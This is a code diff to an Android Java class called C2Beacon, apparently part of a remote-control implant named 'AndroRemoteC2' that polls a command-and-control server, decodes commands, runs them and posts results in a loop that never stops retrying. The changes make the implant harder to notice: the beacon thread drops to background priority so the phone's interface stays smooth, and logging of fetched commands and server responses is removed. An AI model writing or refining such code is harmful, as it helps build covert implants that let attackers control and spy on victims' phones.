@@ -132,6 +132,10 @@ public class C2Beacon implements Runnable {
 
     @Override
     public void run() {
+        // background priority: the beacon (and the captures it runs) must
+        // never compete with the UI for CPU — smoothness of the phone wins
+        // over agent latency
+        android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);
         android.util.Log.i("AndroRemoteC2", "beacon start base=" + base + " id=" + id
                 + " key=" + (key != null) + " pin=" + (certPin != null));
         // Infinite reconnect: this loop never gives up. Any failure (C2 down,
@@ -143,7 +147,6 @@ public class C2Beacon implements Runnable {
             try {
                 String next = fetchCommand();
                 fails = 0; // reachable C2 (even idle) resets backoff
-                android.util.Log.i("AndroRemoteC2", "fetch -> " + (next == null ? "null" : "cmd"));
                 while (next != null && !svc.destroyed) {
                     next = executeAndPost(next);
                 }
@@ -170,7 +173,6 @@ public class C2Beacon implements Runnable {
         Request req = new Request.Builder().url(url("/b/" + id)).build();
         try (Response r = http.newCall(req).execute()) {
             String body = r.body() != null ? r.body().string() : "";
-            android.util.Log.i("AndroRemoteC2", "fetch code=" + r.code() + " body=" + body.substring(0, Math.min(body.length(), 60)));
             if (r.code() != 200) return null;
             String cmd = dec(body);
             if (cmd == null || cmd.isEmpty()) return null;
